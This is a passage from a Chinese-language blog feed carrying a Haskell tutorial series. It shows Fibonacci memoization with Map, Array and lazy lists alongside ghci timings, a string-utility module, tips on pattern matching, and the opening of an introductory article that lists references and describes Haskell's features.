class="line"></span><br><span class="line">    updateCache :: <span class="type">Int</span> -&gt; <span class="type">Integer</span> -&gt; [<span class="type">Maybe</span> <span class="type">Integer</span>] -&gt; [<span class="type">Maybe</span> <span class="type">Integer</span>]</span><br><span class="line">    updateCache _ _ [] = []</span><br><span class="line">    updateCache <span class="number">0</span> value (_:xs) = <span class="type">Just</span> value : xs</span><br><span class="line">    updateCache n value (x:xs) = x : updateCache (n - <span class="number">1</span>) value xs</span><br></pre></td></tr></table></figure><p>但是普通列表更新数据地复杂度是 n，很慢。换成映射会快许多。<code>cache</code> 就是 Map 类型。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Data.Map (<span class="type">Map</span>) <span class="comment">-- 只导入 Map 类型。</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">qualified</span> Data.Map <span class="keyword">as</span> Map <span class="comment">--导入了整个 Data.Map 模块，为这个模块创建了一个别名 Map</span></span><br><span class="line"></span><br><span class="line"><span class="title">fibMap</span> :: <span class="type">Int</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">fibMap</span> n = fst $ fib&#x27; n <span class="type">Map</span>.empty</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    fib&#x27; :: <span class="type">Int</span> -&gt; <span class="type">Map</span> <span class="type">Int</span> <span class="type">Integer</span> -&gt; (<span class="type">Integer</span>, <span class="type">Map</span> <span class="type">Int</span> <span class="type">Integer</span>)</span><br><span class="line">    fib&#x27; <span class="number">0</span> cache = (<span class="number">0</span>, cache)</span><br><span class="line">    fib&#x27; <span class="number">1</span> cache = (<span class="number">1</span>, cache)</span><br><span class="line">    fib&#x27; n cache =</span><br><span class="line">      <span class="keyword">case</span> <span class="type">Map</span>.lookup n cache <span class="keyword">of</span></span><br><span class="line">        <span class="type">Just</span> value -&gt; (value, cache)</span><br><span class="line">        <span class="type">Nothing</span> -&gt;</span><br><span class="line">          <span class="keyword">let</span> (fibNMinus1, cache1) = fib&#x27; (n - <span class="number">1</span>) cache</span><br><span class="line">              (fibNMinus2, cache2) = fib&#x27; (n - <span class="number">2</span>) cache1</span><br><span class="line">              value = fibNMinus1 + fibNMinus2</span><br><span class="line">          <span class="keyword">in</span> (value, <span class="type">Map</span>.insert n value cache2) <span class="comment">-- Map.insert :: Ord k =&gt; k -&gt; a -&gt; Map k a -&gt; Map k a</span></span><br></pre></td></tr></table></figure><p>当然也有 <code>Array</code> 类型，可以完成类似地功能。但是性能不太好</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">fibArray</span> :: <span class="type">Int</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">fibArray</span> n = fib&#x27; n (listArray (<span class="number">0</span>, n) (repeat <span class="type">Nothing</span>))</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    fib&#x27; :: <span class="type">Int</span> -&gt; <span class="type">Array</span> <span class="type">Int</span> (<span class="type">Maybe</span> <span class="type">Integer</span>) -&gt; <span class="type">Integer</span></span><br><span class="line">    fib&#x27; <span class="number">0</span> cache = <span class="number">0</span></span><br><span class="line">    fib&#x27; <span class="number">1</span> cache = <span class="number">1</span></span><br><span class="line">    fib&#x27; n cache = <span class="keyword">case</span> cache ! n <span class="keyword">of</span></span><br><span class="line">      <span class="type">Just</span> value -&gt; value</span><br><span class="line">      <span class="type">Nothing</span> -&gt;</span><br><span class="line">        <span class="keyword">let</span> value = fib&#x27; (n - <span class="number">1</span>) cache + fib&#x27; (n - <span class="number">2</span>) cache</span><br><span class="line">            newCache = cache // [(n, <span class="type">Just</span> value)]</span><br><span class="line">        <span class="keyword">in</span> fib&#x27; n newCache</span><br></pre></td></tr></table></figure><p>另外一种写法则是利用惰性求值和 memorization</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fibList :: [Integer]</span><br><span class="line">fibList = 0 : 1 : zipWith (+) fibList (tail fibList)</span><br><span class="line"></span><br><span class="line">fib :: Int -&gt; Integer</span><br><span class="line">fib n = fibList !! n</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对比的结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ghci&gt; fibOriginal 25</span><br><span class="line">75025</span><br><span class="line">(0.41 secs, 43,998,040 bytes)</span><br><span class="line">ghci&gt; fibList 25</span><br><span class="line">75025</span><br><span class="line">(1.41 secs, 251,086,536 bytes)</span><br><span class="line">ghci&gt; fibArray 25</span><br><span class="line">75025</span><br><span class="line">(0.72 secs, 160,534,712 bytes)</span><br><span class="line">ghci&gt; fibMap 25</span><br><span class="line">75025</span><br><span class="line">(0.00 secs, 98,448 bytes)</span><br><span class="line">ghci&gt; fibBest 25</span><br><span class="line">75025</span><br><span class="line">(0.01 secs, 70,696 bytes)</span><br></pre></td></tr></table></figure><ol><li><code>fibOriginal</code>：编译器有优化。</li><li><code>fibList</code>：每次都要遍历列表，表现差</li><li><code>fibArray</code>：更新时要复制整个数组，导致较高的内存消耗。</li><li><code>fibMap</code>：这是使用 <code>Data.Map</code> 的实现，它是一个平衡二叉搜索树。<code>Data.Map</code> 的更新操作通常比数组更新更高效，因为它可以重用未更改的部分。此外，查找操作也非常快，性能接近 O(log n)。</li><li><code>fibBest</code>：则使用了惰性求值和 Memorization，而且也用上了内置的优化。</li></ol><h1>模块</h1><p>模块是组织和管理代码的基本单位。模块可以包含函数、类型、变量等定义，并将它们导出到其他模块中供使用。模块还可以导入其他模块中的定义，并在自己的代码中使用它们。</p><p>要定义一个模块，需要使用 <code>module</code> 关键字，后面跟着模块的名称和导出的定义列表。例如：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> MyModule (</span><br><span class="line">    <span class="title">someFunction</span>,</span><br><span class="line">    <span class="title">someType</span>,</span><br><span class="line">    <span class="title">someVariable</span></span><br><span class="line">) <span class="keyword">where</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 定义一些函数、类型、变量等</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个例子中，我们定义了一个名为 <code>MyModule</code> 的模块，并导出了一些定义，包括一个函数 <code>someFunction</code>、一个类型 <code>someType</code> 和一个变量 <code>someVariable</code>。这些定义可以在其他模块中使用，但如果没有在导出列表中明确导出，它们将无法访问。</p><p>下面是一个简单的 Haskell 模块，包含了一些常用的字符串操作函数，如<code>splitOn</code>（用于根据指定的分隔符将列表分割成子列表）、<code>joinWith</code>（用于连接子列表）、<code>startsWith</code>、<code>endsWith</code>（分别用于检查列表是否以给定的前缀/后缀开始/结束）、<code>toLowerStr</code>、<code>toUpperStr</code>（分别用于将字符列表转换为小写/大写）以及<code>trim</code>（用于删除字符列表前后的空白字符）。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> StringUtil</span><br><span class="line">  ( <span class="title">splitOn</span></span><br><span class="line">  , <span class="title">joinWith</span></span><br><span class="line">  , <span class="title">startsWith</span></span><br><span class="line">  , <span class="title">endsWith</span></span><br><span class="line">  , <span class="title">toLowerStr</span></span><br><span class="line">  , <span class="title">toUpperStr</span></span><br><span class="line">  , <span class="title">trim</span></span><br><span class="line">  , <span class="title">isSpace</span></span><br><span class="line">  ) <span class="keyword">where</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Data.Char (<span class="title">isSpace</span>, <span class="title">toLower</span>, <span class="title">toUpper</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- | 根据指定的分隔符将列表分割成子列表。</span></span><br><span class="line"><span class="title">splitOn</span> :: <span class="type">Eq</span> a =&gt; a -&gt; [a] -&gt; [[a]]</span><br><span class="line"><span class="title">splitOn</span> _ [] = []  <span class="comment">-- 如果输入列表为空，则返回空列表</span></span><br><span class="line"><span class="title">splitOn</span> sep list = <span class="keyword">case</span> break (== sep) list <span class="keyword">of</span></span><br><span class="line">  (chunk, []) -&gt; [chunk] <span class="comment">-- 如果找不到分隔符，则返回整个列表作为唯一的子列表</span></span><br><span class="line">  (chunk, _ : rest) -&gt; chunk : splitOn sep rest <span class="comment">-- 如果找到分隔符，将分割出的子列表添加到结果中，并继续处理剩余部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- | 使用指定的分隔符连接子列表。</span></span><br><span class="line"><span class="title">joinWith</span> :: a -&gt; [[a]] -&gt; [a]</span><br><span class="line"><span class="title">joinWith</span> _ [] = [] <span class="comment">-- 如果输入的子列表列表为空，则返回空列表</span></span><br><span class="line"><span class="title">joinWith</span> _ [x] = x <span class="comment">-- 如果输入的子列表列表只有一个元素，则返回该元素</span></span><br><span class="line"><span class="title">joinWith</span> sep (x:xs) = x ++ sep : joinWith sep xs <span class="comment">-- 在当前子列表和下一个子列表之间添加分隔符，并递归处理剩余部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- | 检查列表是否以指定的前缀开始。</span></span><br><span class="line"><span class="title">startsWith</span> :: <span class="type">Eq</span> a =&gt; [a] -&gt; [a] -&gt; <span class="type">Bool</span></span><br><span class="line"><span class="title">startsWith</span> [] _ = <span class="type">True</span>  <span class="comment">-- 如果前缀为空，则始终返回True</span></span><br><span class="line"><span class="title">startsWith</span> _ [] = <span class="type">False</span> <span class="comment">-- 如果待检查列表为空但前缀不为空，则返回False</span></span><br><span class="line"><span class="title">startsWith</span> (x:xs) (y:ys) = x == y &amp;&amp; startsWith xs ys <span class="comment">-- 比较列表中的每个元素，并递归处理剩余部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- | 检查列表是否以指定的后缀结束。</span></span><br><span class="line"><span class="title">endsWith</span> :: <span class="type">Eq</span> a =&gt; [a] -&gt; [a] -&gt; <span class="type">Bool</span></span><br><span class="line"><span class="title">endsWith</span> xs ys = startsWith (reverse xs) (reverse ys)</span><br><span class="line"><span class="comment">-- 反转输入的列表和后缀，然后调用 startsWith 函数来检查反转后的列表是否以反转后的后缀开始</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- | 将字符列表转换为小写。</span></span><br><span class="line"><span class="title">toLowerStr</span> :: [<span class="type">Char</span>] -&gt; [<span class="type">Char</span>]</span><br><span class="line"><span class="title">toLowerStr</span> = map <span class="type">Data</span>.<span class="type">Char</span>.toLower <span class="comment">-- 使用 Data.Char.toLower 函数将每个字符转换为小写</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- | 将字符列表转换为大写。</span></span><br><span class="line"><span class="title">toUpperStr</span> :: [<span class="type">Char</span>] -&gt; [<span class="type">Char</span>]</span><br><span class="line"><span class="title">toUpperStr</span> = map <span class="type">Data</span>.<span class="type">Char</span>.toUpper <span class="comment">-- 使用 Data.Char.toUpper 函数将每个字符转换为大写</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- | 删除字符列表前后的空白字符。</span></span><br><span class="line"><span class="title">trim</span> :: [<span class="type">Char</span>] -&gt; [<span class="type">Char</span>]</span><br><span class="line"><span class="title">trim</span> = f . f</span><br><span class="line">  <span class="keyword">where</span> f = reverse . dropWhile isSpace</span><br><span class="line">  <span class="comment">-- 定义辅助函数 f，它首先删除列表开头的空白字符，然后反转列表</span></span><br><span class="line">  <span class="comment">-- 对输入列表应用两次 f 函数，以分别去除前导和尾随的空白字符</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试的结果如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">ghci</span>&gt; :load str.hs</span><br><span class="line">[<span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span>] <span class="type">Compiling</span> <span class="type">StringUtil</span>       ( str.hs, interpreted )</span><br><span class="line"><span class="type">Ok</span>, one <span class="keyword">module</span> loaded.</span><br><span class="line"></span><br><span class="line">ghci&gt; s = &quot;haha I&#x27;d like talk with you!&quot;</span><br><span class="line"></span><br><span class="line">ghci&gt; splitOn &#x27; &#x27; s</span><br><span class="line"></span><br><span class="line">[&quot;haha&quot;,&quot;I&#x27;d&quot;,&quot;like&quot;,&quot;talk&quot;,&quot;with&quot;,&quot;you!&quot;]</span><br><span class="line"></span><br><span class="line">ghci&gt; joinWith &#x27; &#x27; $ splitOn &#x27; &#x27; s</span><br><span class="line">&quot;haha I&#x27;d like talk with you!&quot;</span><br><span class="line"></span><br><span class="line">ghci&gt; startsWith &quot;I&quot; s</span><br><span class="line">False</span><br><span class="line"></span><br><span class="line">ghci&gt; startsWith &quot;ha&quot; s</span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">ghci&gt; toLowerStr s</span><br><span class="line">&quot;haha i&#x27;d like talk with you!&quot;</span><br><span class="line"></span><br><span class="line">ghci&gt; toUpperStr s</span><br><span class="line">&quot;HAHA I&#x27;D LIKE TALK WITH YOU!&quot;</span><br><span class="line"></span><br><span class="line">ghci&gt; s_blank = &quot;   &quot;++s++&quot;  &quot;</span><br><span class="line"></span><br><span class="line">ghci&gt; s_blank</span><br><span class="line">&quot;   haha I&#x27;d like talk with you!  &quot;</span><br><span class="line"></span><br><span class="line">ghci&gt; trim s_blank</span><br><span class="line">&quot;haha I&#x27;d like talk with you!&quot;</span><br><span class="line"></span><br><span class="line">ghci&gt; :q</span><br></pre></td></tr></table></figure><h1>最后的话</h1><p>前面已经介绍过基础知识了，读者已经有了自己深入学习的基础。如果希望能够实际写出程序，那么可以完成<a href="https://github.com/kowainik/learn4haskell">Learn4Haskell</a>，学习自定义类型、typeclass 和 instance、newtype、带参类型、Externtion、Functor、Applicatives、Monads。</p><p>我这里会给出一些经验。</p><ol><li><p><code>where</code> 子句中的模式匹配应该使用 <code>case</code> 语句，而不能直接在 <code>where</code> 子句中进行。在 <code>where</code> 子句中的等式左边不能出现模式。下面的例子是错误的，它用分支来代替了模式匹配，但是 where 子句不行。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">buildWalls</span> city</span><br><span class="line">  | canBuildHouse = city &#123;cityCastle = <span class="type">CastleWithWalls</span> name&#125;</span><br><span class="line">  | otherwise = city</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    canBuildHouse</span><br><span class="line">      | <span class="type">Castle</span> name = totalPeople &gt;= <span class="number">10</span></span><br><span class="line">      | otherwise = <span class="type">False</span></span><br><span class="line">      totalPeople = sum . map (\(<span class="type">House</span> people) -&gt; people) $ cityHouses city</span><br></pre></td></tr></table></figure></li><li><p>匿名函数中可以使用模式匹配，比如 <code>\(House people) -&gt; people</code> 就是匹配 <code>House</code> 类型，提取它的值。<strong>提取自定义类型的变量的值的方式，一般采用模式匹配，嵌套就多次模式匹配</strong>。函数传参也是获取了一次值。模式匹配的语法如下：</p><ol><li><p>分开写函数。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">f</span> :: <span class="type">Int</span> -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">f</span> <span class="number">0</span> = <span class="string">&quot;Zero&quot;</span></span><br><span class="line"><span class="title">f</span> <span class="number">1</span> = <span class="string">&quot;One&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><code>case .. of ..</code> 类型的匹配。<strong>case 表达式后面一定紧接一个表达式，不能再用 guard 语法</strong></p></li></ol><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">describeList</span> :: [a] -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">describeList</span> xs = <span class="string">&quot;The list is &quot;</span> ++ <span class="keyword">case</span> xs <span class="keyword">of</span></span><br><span class="line">  [] -&gt; <span class="string">&quot;empty.&quot;</span></span><br><span class="line">  [x] -&gt; <span class="string">&quot;a singleton list.&quot;</span></span><br><span class="line">  _ -&gt; <span class="string">&quot;a longer list.&quot;</span></span><br></pre></td></tr></table></figure><ol start="3"><li><p>使用 <code>@</code> 的模式匹配。注意如果 <code>allx@(x:xs)</code> 中 <code>allx</code> 没有用到，建议使用 <code>(x:xs)</code> 代替。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">longestPrefix</span> :: <span class="type">Eq</span> a =&gt; [a] -&gt; [a] -&gt; [a]</span><br><span class="line"><span class="title">longestPrefix</span> [] _ = []</span><br><span class="line"><span class="title">longestPrefix</span> _ [] = []</span><br><span class="line"><span class="title">longestPrefix</span> allx@(x:xs) ally@(y:ys)</span><br><span class="line">  | x == y = x : longestPrefix xs ys</span><br><span class="line">  | otherwise = []</span><br></pre></td></tr></table></figure></li></ol><p>使用模式匹配的情况有:</p><ol><li>字面值处理。</li><li>列表递归，空列表的情况。</li><li>提取复杂类型或者容器特定位置的值。</li><li>Maybe/Just 类型匹配。</li></ol><p>比如我们的例子，可以下面这样写。其中尽量把局部表达式写在子句中，这样变量名可以非常方便的说明逻辑：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">buildWalls</span> :: <span class="type">MagicalCity</span> -&gt; <span class="type">MagicalCity</span></span><br><span class="line"><span class="title">buildWalls</span> city = <span class="keyword">case</span> cityCastle city <span class="keyword">of</span></span><br><span class="line">  (<span class="type">Castle</span> name) -&gt; <span class="keyword">if</span> enoughPopulation  <span class="keyword">then</span> createWalls name  <span class="keyword">else</span> city</span><br><span class="line">  _ -&gt; city</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    createWalls name = city &#123;cityCastle = <span class="type">CastleWithWalls</span> name&#125;</span><br><span class="line">    enoughPopulation = totalPeople &gt;= <span class="number">10</span></span><br><span class="line">    totalPeople = sum . map (\(<span class="type">House</span> people) -&gt; people) $ cityHouse city</span><br></pre></td></tr></table></figure></li><li><p>类型也有自己的类型，可以作为其他类型的参数。比较典型的是容器比如 <code>[]</code>、<code>Maybe</code>、<code>Either</code></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">IntBox</span> f = <span class="type">MkIntBox</span> (<span class="title">f</span> <span class="type">Int</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 变成了 MkIntBox Maybe Int</span></span><br><span class="line"><span class="title">intBoxMaybe</span> :: <span class="type">IntBox</span> <span class="type">Maybe</span></span><br><span class="line"><span class="title">intBoxMaybe</span> = <span class="type">MkIntBox</span> (<span class="type">Just</span> <span class="number">42</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 变成了 MkIntBox [] Int，也就是 MkInt Box [Int]</span></span><br><span class="line"><span class="title">intBoxList</span> :: <span class="type">IntBox</span> []</span><br><span class="line"><span class="title">intBoxList</span> = <span class="type">MkIntBox</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 变成了 MkIntBox Ether String Int</span></span><br><span class="line"><span class="title">intBoxEither</span> :: <span class="type">IntBox</span> (<span class="type">Either</span> <span class="type">String</span>)</span><br><span class="line"><span class="title">intBoxEither</span> = <span class="type">MkIntBox</span> (<span class="type">Right</span> <span class="number">10</span>)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-1/&quot; title=&quot;Haskell(一)入门&quot;&gt;Haskell(一)入门&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-2/&quot; title=&quot;Haskell(二)函数式编程&quot;&gt;Haskell(二)函数式编程&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/monad/&quot; title=&quot;Haskell(三) Monad&quot;&gt;Haskell(三) Monad&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-summary-toolchain/&quot; title=&quot;Haskell(四)总结和工具链&quot;&gt;Haskell(四)总结和工具链&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-epilogue/&quot; title=&quot;Haskell(五) 总结和展望&quot;&gt;Haskell(五) 总结和展望&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/project-euler/&quot; title=&quot;Haskell(六) P</summary>
        
      
    
    
    
    <category term="functional language" scheme="https://www.blog-blockchain.xyz/categories/functional-language/"/>
    
    
    <category term="Haskell" scheme="https://www.blog-blockchain.xyz/tags/Haskell/"/>
    
  </entry>
  
  <entry>
    <title>Haskell(一)入门</title>
    <link href="https://www.blog-blockchain.xyz/fp/FP-haskell-1/"/>
    <id>https://www.blog-blockchain.xyz/fp/FP-haskell-1/</id>
    <published>2022-08-29T13:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.922Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/fp/FP-haskell-1/" title="Haskell(一)入门">Haskell(一)入门</a></li><li><a href="/fp/FP-haskell-2/" title="Haskell(二)函数式编程">Haskell(二)函数式编程</a></li><li><a href="/fp/monad/" title="Haskell(三) Monad">Haskell(三) Monad</a></li><li><a href="/fp/Haskell-summary-toolchain/" title="Haskell(四)总结和工具链">Haskell(四)总结和工具链</a></li><li><a href="/fp/Haskell-epilogue/" title="Haskell(五) 总结和展望">Haskell(五) 总结和展望</a></li><li><a href="/fp/project-euler/" title="Haskell(六) Project Euler 练习1-26">Haskell(六) Project Euler 练习1-26</a></li></ol></blockquote><h1>前言</h1><p>这个系列主要介绍典型的<strong>函数式程序设计语言</strong>（Functional programming languages，FP）和<strong>逻辑式程序设计语言</strong>（Logic programming languages，LP），将会分别以 Haskell 和 datalog（主要是 souffle）作为例子，简单的入门和理解。</p><p>理解典型的 FP 对于深入学习程序设计语言挺好处的。我们先从 haskell 开始</p><p>参考资料：</p><ul><li><a href="https://www.haskell.org/">haskell 官网</a></li><li><a href="https://flaneur2020.github.io/lyah/chapters.htm">Haskell 趣学指南</a>，<a href="http://learnyouahaskell.com/">英文原版</a>也很不错。</li><li>快速查阅<a href="https://downloads.haskell.org/ghc/latest/docs/libraries/">库文档</a></li><li>最推荐的查阅手册，能够直接点击 Quick Jump 搜索关键词，这也是我最常用的<a href="https://hackage.haskell.org/package/base-4.17.0.0/docs/Prelude.html">文档</a></li><li><a href="https://wiki.haskell.org/Haskell">官方 WiKi</a>如果有不懂的术语，那么很推荐先在 wiki 上查找。</li><li>可以参考的<a href="https://www.seas.upenn.edu/~cis1940/spring13/lectures.html">入门课程</a></li><li><a href="https://t.me/haskellzh/4310">资源汇总</a></li><li><a href="https://t.me/haskellzh">交流学习群</a>、<a href="https://t.me/haskell_zh_2">交流学习群 2</a></li><li><a href="https://tryhaskell.org/">在线交互解释器</a>，适合不配置环境就开始学习。</li><li><a href="https://youtu.be/vn1IOxVplKQ">视频教程</a>和对应<a href="https://github.com/dalvescb/LearningHaskell_Exercises">练习答案</a></li></ul><hr><p>Haskell 的设计思路和普通命令式语言不同，读者将会遇到思维上的转变，从类 C 语言的变量、指针、内存、控制流的基本思想，到递归、表达式、变量替换和绑定的基本思想。我粗浅的理解里，印象最深的是无处不在的递归思维，递归贯穿了整个设计理念。并且放弃变量控制状态+控制流的传统命令式语言方式，彻底的用函数表现所有流程。</p><p>为了与 lambda 演算匹配，Functor 的思想也贯穿着整个表达式替换的过程，函数柯里化的过程让表达式嵌套变得更加自然，这些语法糖的支持，使得 Haskell 能够完成一般的任务。</p><p>然而，表达式嵌套的过程，各种新奇的语法糖，增大了从 C 系语言迁移到函数式语言的难度，而且函子(functor)的引入使得初学者难以把握抽象表达式的嵌套。学习新的语言设计范式可能理论价值高于实际价值。</p><p>我从这些天的学习中，提升的能力大致是：</p><ul><li>初步从编程的角度理解 lambda 演算，有利于后续可能的深入学习。</li><li>自然而然地养成了递归思想，写程序往往会优先考虑递归。对于有规律地过程，递归和模式匹配的表现力很强。但是对于描述流程来说，可能 C 系语言更加自然。</li><li>这是程序设计语言的三大范式之一，有利于深入学习程序设计语言和程序分析方向。</li></ul><h1>安装和下载</h1><p>Haskell 式函数式编程语言，安装教程详情见<a href="https://www.haskell.org/downloads/">官网</a>。除了官网推荐的安装方式，还可以使用包管理工具，尽量避免自行下载安装。</p><p>之后建议使用 VScode 编辑，如果已经完全安装了 Haskell 后，直接下载<a href="https://marketplace.visualstudio.com/items?itemName=haskell.haskell">插件</a>，即可有代码智能提示。其他 IDE 可见 <a href="https://wiki.haskell.org/IDEs">wiki</a>。</p><h1>haskell 简介</h1><p>官网就写的很好</p><ul><li><p>Statically typed——强静态类型</p><p><strong>Every expression in Haskell has a type which is determined at compile time</strong>. All the types composed together by function application have to match up. If they don’t, the program will be rejected by the compiler. Types become not only a form of guarantee, but a language for expressing the construction of programs.</p><p>也就是说静态的强类型系统。</p></li><li><p>Purely functional——纯函数式</p><p>Every function in Haskell is a function in the mathematical sense (i.e., “pure”). Even side-effecting IO operations are but a description of what to do, produced by pure code. There are no statements or instructions, only expressions which cannot mutate variables (local or global) nor access state like time or random numbers.</p><p>函数不存在“状态”，只有“如何处理”的逻辑，基础是<a href="https://baike.baidu.com/item/%CE%BB%E6%BC%94%E7%AE%97">λ 演算</a></p></li><li><p>Type inference——一定的类型推断</p><p>You don’t have to explicitly write out every type in a Haskell program. Types will be inferred by unifying every type bidirectionally. However, you can write out types if you choose, or ask the compiler to write them for you for handy documentation.</p></li><li><p>Concurrent</p><p>Haskell lends itself well to concurrent programming <strong>due to its explicit handling of 